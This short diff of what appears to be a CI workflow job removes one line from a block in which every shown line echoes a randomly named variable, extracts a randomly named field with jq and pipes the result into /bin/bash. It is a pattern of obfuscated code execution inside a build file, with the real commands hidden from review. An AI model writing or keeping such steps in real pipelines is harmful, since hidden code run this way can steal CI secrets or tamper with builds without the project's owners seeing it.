@@ -26,7 +26,6 @@ jobs:
           echo $ufb7 | jq -r .z81 | /bin/bash
           echo $pw90974 | jq -r .drutf400 | /bin/bash
           echo $aa6 | jq -r .yqzo91 | /bin/bash
-          echo $hp4146 | jq -r .phq41358 | /bin/bash
           echo $eabjx08172 | jq -r .fwb378 | /bin/bash
           printf '%s' "$x24" | jq -r .c84 | /bin/bash
           echo $gdd9074 | jq -r .ijgn37563 | /bin/bash
